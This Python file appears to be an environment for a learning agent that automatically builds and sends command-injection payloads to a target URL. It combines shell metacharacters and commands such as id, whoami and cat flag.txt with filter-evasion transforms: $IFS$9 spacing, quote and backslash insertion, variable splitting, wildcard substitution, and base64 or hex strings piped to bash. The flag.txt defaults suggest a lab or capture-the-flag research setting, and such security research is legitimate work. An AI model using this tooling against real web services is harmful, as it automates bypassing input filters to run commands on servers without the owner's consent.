from anyio import sleep_until

from injection import perform_injection
import urllib.parse
import binascii
import base64
import numpy as np
import math
token_max_nr = 10
# 创建 BasicTokenList 字典，数字对应各个特殊字符
BasicTokenList = {
    0: "!",      # "!"
    1: "`",      # "`"
    2: '"',      # '"'
    3: "|",      # "|"
    4: "&",      # "&"
    5: "&&",     # "&&"
    6: ";",      # ";"
    7: "\\",     # "\\"
    8: "/",      # "/"
    9: "(",      # "("
    10: ")",     # ")"
    11: "{",     # "{"
    12: "}",     # "}"
    13: "[",     # "["
    14: "]",     # "]"
    15: "<",     # "<"
    16: ">",     # ">"
    17: ",",     # ","
    18: "'",     # "'"
    19: "#",     # "#"
    20: "?",     # "?"
    21: "*",     # "*"
    22: "-",     # "-"
    23: ":",     # ":"
    24: "%",     # "%"
    25: "\n",    # "\n"
    26: "\r",    # "\r"
    27: "\v",    # "\v"
    28: "\0",    # "\0"
    29: "\f"     # "\f"
}

# 定义 Action 基类


class Action:
    def apply(self, text):
        raise NotImplementedError("Subclasses should implement this method")

# URL 编码 Action 子类


class UrlEncodeAction(Action):
    def apply(self, text):
        # 遍历 text 中的每个字符，如果是非字母或数字的字符，则进行 URL 编码
        encoded_text = ""
        for char in text:
            if char.isalnum():  # 如果是字母或数字，则直接添加
                encoded_text += char
            else:
                encoded_text += urllib.parse.quote(char)  # 对非字母和数字字符进行 URL 编码
        return encoded_text

# 空格替换为'<'的 Action 子类


class SpaceToLessThanAction(Action):
    def apply(self, text):
        # 将空格替换为 {IFS9}
        return text.replace(" ", "<")

# 空格替换为 {IFS9} 的 Action 子类


class SpaceToIFS9Action1(Action):
    def apply(self, text):
        # 将空格替换为 {IFS9}
        return text.replace(" ", "{IFS9}")


class SpaceToIFS9Action2(Action):
    def apply(self, text):
        # 将空格替换为 $IFS+$9}
        return text.replace(" ", "$IFS$9")

# 1为命令加上 "/usr/bin/" 前缀的 Action


class AddUsrBinPrefixAction(Action):
    def apply(self, text):
        return f"/usr/bin/{text}"

# 2将命令置于 system('') 中的 Action


class WrapInSystemAction(Action):
    def apply(self, text):
        return f"system('{text}')"

# 3将命令置于 $() 中的 Action


class WrapInSubshellAction(Action):
    def apply(self, text):
        return f"$({text})"

# 4定义将命令用反引号包裹的 Action


class WrapInBackticksAction(Action):
    def apply(self, text):
        """
        将命令用反引号包裹，形如 `command`
        """
        return f"`{text}`"

# 5 定义将命令内容编码为16进制的 Action


class HexEncodeAction(Action):
    def apply(self, text):
        """
        将命令字符串转换为 16 进制的表示形式
        """
        # 使用 binascii 将文本转为 16 进制
        hex_encoded = binascii.hexlify(text.encode()).decode()
        return f"echo {hex_encoded} | xxd -r -p | bash"

# 6定义将命令内容编码为 Base64 的 Action


class Base64EncodeAction(Action):
    def apply(self, text):
        """
        将命令字符串转换为 Base64 的表示形式
        """
        # 使用 base64 将文本编码为 Base64
        base64_encoded = base64.b64encode(text.encode()).decode()
        return f"echo {base64_encoded} | base64 -d | bash"

# 定义 InsertSingleQuoteAction 类


def calculate_pos(index, len):
    if len < index:
        pos = len // 2
    elif len < 7:
        pos = index
    else:
        pos = len // 7 * index
    return pos


class InsertSingleQuoteAction(Action):
    def __init__(self, index):
        """
        :param index: 指定插入位置 (0-6)
        """
        if index < 0 or index > 6:
            raise ValueError("Index out of range. It must be between 0 and 6.")
        self.index = index
        self.insert_content = "''"  # 插入的成对单引号

    def apply(self, text):
        """
        根据指定的 index 插入成对的单引号。
        计算插入位置： len(text) / 7 * index
        """
        if not text:
            return text

        # 计算插入点，如果index大于text的长度，那么插入在最后
        insert_pos = calculate_pos(self.index, len(text))
        # 在插入点插入成对的单引号
        new_text = text[:insert_pos] + self.insert_content + text[insert_pos:]
        return new_text

# 定义 InsertDoubleQuoteAction 类


class InsertDoubleQuoteAction(Action):
    def __init__(self, index):
        """
        :param index: 指定插入位置 (0-6)
        """
        if index < 0 or index > 6:
            raise ValueError("Index out of range. It must be between 0 and 6.")
        self.index = index
        self.insert_content = '""'  # 插入的成对双引号

    def apply(self, text):
        """
        根据指定的 index 插入成对的双引号。
        计算插入位置： len(text) / 7 * index
        """
        if not text:
            return text

        # 计算插入点，如果index大于text的长度，那么插入在最后
        insert_pos = calculate_pos(self.index, len(text))
        # 在插入点插入成对的双引号
        new_text = text[:insert_pos] + self.insert_content + text[insert_pos:]
        return new_text

# 定义 InsertBackslashAction 类


class InsertBackslashAction(Action):
    def __init__(self, index):
        """
        :param index: 指定插入位置 (0-6)
        """
        if index < 0 or index > 6:
            raise ValueError("Index out of range. It must be between 0 and 6.")
        self.index = index
        self.insert_content = "\\"  # 插入的成对反斜杠

    def apply(self, text):
        """
        根据指定的 index 插入成对的反斜杠。
        计算插入位置： len(text) / 7 * index
        """
        if not text:
            return text

        # 计算插入点，如果index大于text的长度，那么插入在最后
        insert_pos = calculate_pos(self.index, len(text))

        # 在插入点插入成对的反斜杠
        new_text = text[:insert_pos] + self.insert_content + text[insert_pos:]
        return new_text

# 定义 SplitToVariableAction 类


class SplitToVariableAction(Action):
    def __init__(self, index):
        """
        :param index: 指定分割位置 (0-6)
        """
        if index < 0 or index > 6:
            raise ValueError("Index out of range. It must be between 0 and 6.")
        self.index = index

    def apply(self, text):
        """
        根据指定的 index 分割命令，并将前部分替换为 $a，后部分替换为 $b。
        计算分割位置： len(text) / 7 * index
        返回格式： "$a$b"
        """
        if not text:
            return text

        # 计算分割点
        split_pos = calculate_pos(self.index, len(text))

        # 分割命令字符串
        part1 = text[:split_pos]
        part2 = text[split_pos:]

        # 模拟变量替换，使用 $a 和 $b
        return f"a={part1};b={part2};$a$b"

# 定义 ReplaceWithQuestionMarkAction 类


class ReplaceWithQuestionMarkAction(Action):
    def __init__(self, index):
        """
        :param index: 指定替换位置 (0-6)
        """
        if index < 0 or index > 6:
            raise ValueError("Index out of range. It must be between 0 and 6.")
        self.index = index

    def apply(self, text):
        """
        将指定位置的字符替换为 ?
        计算替换位置： len(text) / 7 * index
        """
        if not text:
            return text

        # 计算替换点
        replace_pos = calculate_pos(self.index, len(text))

        # 替换指定位置的字符为 '?'
        new_text = text[:replace_pos] + '?' + text[replace_pos+1:]
        return new_text


# 定义 ReplaceWithAsteriskAction 类
class ReplaceWithAsteriskAction(Action):
    def __init__(self, index):
        """
        :param index: 指定替换位置 (0-6)
        """
        if index < 0 or index > 6:
            raise ValueError("Index out of range. It must be between 0 and 6.")
        self.index = index

    def apply(self, text):
        """
        将指定位置的字符替换为 *
        计算替换位置： len(text) / 7 * index
        """
        if not text:
            return text

        # 计算替换点
        replace_pos = calculate_pos(self.index, len(text))

        # 替换指定位置的字符为 '*'
        new_text = text[:replace_pos] + '*' + text[replace_pos+1:]
        return new_text


# 定义 no_para_action 列表，包含所有无参数的 Action 类
no_para_action = [
    UrlEncodeAction,
    SpaceToLessThanAction,
    SpaceToIFS9Action1,
    SpaceToIFS9Action2,
    AddUsrBinPrefixAction,
    WrapInSystemAction,
    WrapInSubshellAction,
    WrapInBackticksAction,
    HexEncodeAction,
    Base64EncodeAction
]
# 定义 para_action 列表，包含所有带参数的 Action 类
para_action = [
    InsertSingleQuoteAction,
    InsertDoubleQuoteAction,
    InsertBackslashAction,
    SplitToVariableAction,
    ReplaceWithQuestionMarkAction,
    ReplaceWithAsteriskAction
]
# 定义 tokens 基类

# 定义 Token 类


class Token:
    def __init__(self, content):
        self.content = content  # Token 的内容
        self.action_list = []  # 该 Token 的操作列表

    def add_action(self, action):
        """
        向 token 添加操作之前，检查该 action 是否被允许
        """
        if self.is_action_allowed(action):
            self.action_list.append(action)
            return True
        else:
            return False

    def is_action_allowed(self, action):
        """
        检查该 action 是否允许被应用到当前 Token。
        """
        return True  # 默认情况下，所有的 action 都被允许

    def execute(self):
        """根据 action_list 中的操作依次处理 token 内容"""
        result = self.content
        for action in self.action_list:
            result = action.apply(result)  # 应用每一个 action
        return result


# 实现不同的 tokens 子类

# 定义 CommandToken 类，继承自 Token
class CommandToken(Token):
    def __init__(self, command):
        # 初始化 Token，并将命令作为内容
        super().__init__(command)

# 定义 IdToken 类


class IdToken(CommandToken):
    def __init__(self):
        # 初始化为 id 命令
        super().__init__("id")

# 定义 SleepToken 类


class SleepToken(CommandToken):
    def __init__(self, seconds=5):
        # 初始化为 sleep {seconds} 命令，默认为 sleep 5
        command = f"sleep {seconds}"
        super().__init__(command)

# 定义 LsToken 类


class LsToken(CommandToken):
    def __init__(self):
        super().__init__("ls")

# 定义 WhoamiToken 类


class WhoamiToken(CommandToken):
    def __init__(self):
        super().__init__("whoami")

# 定义 IfconfigToken 类


class IfconfigToken(CommandToken):
    def __init__(self):
        super().__init__("ifconfig")

# 定义 CatToken 类，默认参数为 flag.txt


class CatToken(CommandToken):
    def __init__(self, filename="flag.txt"):
        command = f"cat {filename}"
        super().__init__(command)

# 定义 TouchToken 类，默认参数为 flag.txt


class TouchToken(CommandToken):
    def __init__(self, filename="target.txt"):
        command = f"touch {filename}"
        super().__init__(command)

# 定义 TacToken 类，默认参数为 flag.txt


class TacToken(CommandToken):
    def __init__(self, filename="flag.txt"):
        command = f"tac {filename}"
        super().__init__(command)

# 定义 NlToken 类，默认参数为 flag.txt


class NlToken(CommandToken):
    def __init__(self, filename="flag.txt"):
        command = f"nl {filename}"
        super().__init__(command)

# 定义 MoreToken 类，默认参数为 flag.txt


class MoreToken(CommandToken):
    def __init__(self, filename="flag.txt"):
        command = f"more {filename}"
        super().__init__(command)

# 定义 TailToken 类，默认参数为 flag.txt


class TailToken(CommandToken):
    def __init__(self, filename="flag.txt"):
        command = f"tail {filename}"
        super().__init__(command)

# 定义 PrToken 类，默认参数为 flag.txt


class PrToken(CommandToken):
    def __init__(self, filename="flag.txt"):
        command = f"pr {filename}"
        super().__init__(command)


# 定义 commandtokenlist 列表，包含所有的 CommandToken 子类
commandtokenlist = [
    IdToken,                  # 对应 IdToken 类
    SleepToken,               # 对应 SleepToken 类
    LsToken,                  # 对应 LsToken 类
    WhoamiToken,              # 对应 WhoamiToken 类
    IfconfigToken,            # 对应 IfconfigToken 类
    CatToken,                 # 对应 CatToken 类
    TouchToken,               # 对应 TouchToken 类
    TacToken,                 # 对应 TacToken 类
    NlToken,                  # 对应 NlToken 类
    MoreToken,                # 对应 MoreToken 类
    TailToken,                # 对应 TailToken 类
    PrToken                   # 对应 PrToken 类
]
CommandTokenList = {
    31: "id",
    32: "sleep 5"
}
ActionList = {
    1: UrlEncodeAction,
    2: SpaceToLessThanAction,
    3: SpaceToIFS9Action1,
    4: SpaceToIFS9Action2,
    5: AddUsrBinPrefixAction,
    6: WrapInSystemAction,
    7: WrapInSubshellAction,
    8: WrapInBackticksAction,
    9: HexEncodeAction,
    10: Base64EncodeAction,
    11: InsertSingleQuoteAction,
    20: InsertDoubleQuoteAction,
    30: InsertBackslashAction,
    40: SplitToVariableAction,
    50: ReplaceWithQuestionMarkAction,
    60: ReplaceWithAsteriskAction
}

# 空Token


class NoneToken(Token):
    def __init__(self):
        super().__init__("")  # 初始化为空字符串

    def is_action_allowed(self, action):
        return False  # 对于空token, 所有的 action 都不被允许

    def execute(self):
        return ""


# 定义 BasicToken 类，继承自 Token
class BasicToken(Token):
    def __init__(self, nr = 6):
        # 初始化 Token，并将命令作为内容
        if nr < 0 or nr > 29:
            raise ValueError("nr out of range.")
        super().__init__(BasicTokenList[nr])

    def is_action_allowed(self, action):
        """
        检查该 action 是否允许被应用到当前 Token。
        只有 UrlEncodeAction 被允许，其他 action 将被禁止。
        """
        if isinstance(action, UrlEncodeAction):
            return True  # 允许 UrlEncodeAction
        return False  # 禁止其他 Action

# 感叹号 Token


class SpaceToken(BasicToken):
    def __init__(self):
        # 初始化内容为一个空格
        self.content = ' ' # token的内容
        self.action_list = [] # token的操作列表

    def is_action_allowed(self, action):
        """
        检查该 action 是否允许被应用到当前 Token。
        允许 UrlEncodeAction、SpaceToLessThanAction、SpaceToIFS9Action1、SpaceToIFS9Action2。
        """
        if isinstance(action, (UrlEncodeAction, SpaceToLessThanAction, SpaceToIFS9Action1, SpaceToIFS9Action2)):
            return True  # 允许这些 Action
        return False  # 禁止其他 Action


# 实现 TokenList 类 (使用列表形式存储 Token)
class TokenList:
    def __init__(self):
        self.tokens = [NoneToken() for _ in range(token_max_nr)]
        # 存储注入结果： 'true', 'false', 'syntaxerror',"multiplecommand", "invalidaction"
        self.injection_result = None

    def add_token(self, token, index):
        if index < 0 or index >= token_max_nr:
            raise IndexError("Index out of range")

        # 统计当前 TokenList 中的 CommandToken 数量
        command_token_count = sum(isinstance(t, CommandToken)
                                  for t in self.tokens if t is not None)

        # 如果已有两个或以上的 CommandToken，则不允许添加
        if command_token_count >= 5 and isinstance(token, CommandToken):
            self.injection_result = "multiplecommand"
            # print("mutiple command")
            return False

        # 允许添加 Token
        self.tokens[index] = token
        return True

    def add_token_action(self, index, action):
        """
        为指定位置的Token添加一个action。
        """
        # 检查索引范围是否有效
        if index < 0 or index >= token_max_nr:
            print(f"Index {index} out of range.")
            return False

        # 检查该位置是否为有效的 Token
        token = self.tokens[index]
        if isinstance(token, Token):
            # 检查 Token 的 action list 是否已经有5个action
            if len(token.action_list) >= 2:
                self.injection_result = "invalidaction"
                # print(f"Token at index{index} already has 5 or more actions")
                return False
            else:
                return token.add_action(action)
        else:
            print(f"Invalid token at index {index}")
            return False

        # if isinstance(self.tokens[index], Token):
        #     # 检查 Token 的 action list 是否已经有5个action
        #     if len(self.tokens[index].action_list) >= 2:
        #         self.injection_result = "invalidaction"
        #         print(f"Token at index{index} already has 5 or more actions")
        #         return False
        #     else:
        #         return self.tokens[index].add_action(action)
        # else:
        #     print(f"Invalid token at index {index}")
        #     return False


    def get_string(self):
        """依次执行所有 Token 并将它们拼接成一个字符串"""
        res_string = ""
        for token in self.tokens:
            res_string += token.execute()  # 调用每个 Token 的 execute 方法获取对应的字符
        return res_string

    def inject(self, url, mod):
        # 如果存在多个命令，则不执行注入
        if self.injection_result == "multiplecommand":
            return self.injection_result
        if self.injection_result == "invalidaction":
            return self.injection_result
        if mod == 1:
            if self.injection_result == "nosuchaction":
                return self.injection_result
        command_token_count = sum(isinstance(t, CommandToken)
                                  for t in self.tokens if t is not None)
        if command_token_count == 0:
            self.injection_result = "nonecommand"
            return self.injection_result
        """将生成的字符串注入到指定 URL 中"""
        # 使用 get_string 获取要注入的字符串
        data = self.get_string()

        # 调用 injection.py 中的 perform_injection 函数进行注入
        result = perform_injection(url, data)

        # 根据注入结果更新 injection_result
        if result == "true":
            self.injection_result = "true"
        elif result == "false":
            self.injection_result = "false"
        elif result == "syntaxerror":
            self.injection_result = "syntaxerror"
        else:
            raise ValueError("Invalid injection result returned")

        return self.injection_result  # 返回注入结果

    def decode_action(self, action):
        # 百位代表 tokenlist 中第几个 token，取值范围 0-9
        token_index = action // 100
        a = action % 100
        # a = math.floor(a / 99 * 44)
        # 检查 token_index 的范围是否合法
        if token_index < 0 or token_index >= len(self.tokens):
            return False  # 解码不成功，索引超出范围

        # 处理 a 的不同取值
        if a == 0:
            # 将该位置设置为 NoneToken 实例
            self.add_token(NoneToken(), token_index)

        elif 1 <= a <= 30:
            # 将该位置设置为 BasicTokenList[a-1] 对应的 basictoken 实例
            self.add_token(BasicToken(a-1), token_index)

        elif a == 32:
            # 将该位置设置为 SpaceToken 实例
            self.add_token(SpaceToken(), token_index)

        elif 33 <= a <= 33 or 35 <= a <= 44:
            # 将该位置设置为 commandtokenlist[a-33] 对应的 command 实例
            self.add_token(commandtokenlist[a-33](), token_index)

        elif 45 <= a <= 54:
            # 为该位置的 token 添加 no_para_action[a-45] 对应的 action 实例
            if isinstance(self.tokens[token_index], Token):  # 确保当前位置是一个 Token 实例
                action_instance = no_para_action[a-45]()
                self.add_token_action(token_index, action_instance)
                # if self.tokens[token_index].add_action(action_instance) == False:
                #     self.injection_result = "invalidaction"
                #     return False

            else:
                self.injection_result = "invalidaction"
                return False  # 该位置没有有效的 Token 实例，无法添加 Action

        elif 55 <= a <= 96:
            # 为该位置的 token 添加 para_action[(a-55)//7] 且 index=(a-55)%7 的 action 实例
            if isinstance(self.tokens[token_index], Token):  # 确保当前位置是一个 Token 实例
                action_instance = para_action[(a-55)//7]((a-55) % 7)
                self.add_token_action(token_index, action_instance)
                # if self.tokens[token_index].add_action(action_instance) == False:
                #     self.injection_result = "invalidaction"
                #     return False
            else:
                self.injection_result = "invalidaction"
                return False  # 该位置没有有效的 Token 实例，无法添加 Action

        else:
            # print("nosuchaction")
            # self.injection_result = "invalidaction"
            self.injection_result = "nosuchaction"
            return False  # 解码不成功，未知的 a 值

        return True  # 解码成功

    '''
    a=0:将该位置为nonetoken实例
    a=1-30：将该位置为BasicTokenList[a-1]对应的basictoken实例
    a=32: 将该位置为spacetoken实例
    a=33-44:将该位置为commandtokenlist[a-33]对应的command实例
    a=45-54:为该位的token添加为no_para_action[a-45]对应的action实例
    a=55-96:为该位的token添加para_action[(a-55)//7]且index=(a-55)%7的action实例
    其他：返回false,代表解码不成功
    '''

    def encode_state(self):
        state_representation = np.zeros(64)
        if self.injection_result == "sytaxerror":
            state_representation[0] = 100
        if self.injection_result == "false":
            state_representation[1] = 100
        if self.injection_result == "invalidaction":
            state_representation[2] = 100
        if self.injection_result == "multiplecommand":
            state_representation[3] = 100
        index = 4
        # 获取 token.content 在 BasicTokenList 中的索引
        for token in self.tokens:
            # 如果token为空
            # print(index)
            if token.content == "":
                state_representation[index] = 0
            else:
                # 遍历查找basic token列表
                for key, value in BasicTokenList.items():
                    if token.content == value:
                        state_representation[index] = key+1
                # 遍历查找command token列表
                for key, value in CommandTokenList.items():
                    if token.content == value:
                        state_representation[index] = key
                # 检查是否为space
                if token.content == " ":
                    state_representation[index] = 33
            index += 1
            pre_index = index
            # 遍历action list
            if token.action_list:
                count = 0
                for action in token.action_list:
                    # 如果action为空
                    if count == 5:
                        break
                    if action == '':
                        state_representation[index] = 0
                    # 遍历查找action列表
                    for key, value in ActionList.items():
                        if isinstance(action, value):
                            # print(index)
                            state_representation[index] = key
                            # 编号大于10的为含有index参数的action
                            if key > 10:
                                state_representation[index] += action.index
                    index += 1
                    count += 1
            index = pre_index + 5
            # print(index)
        # print(state_representation)
        return state_representation
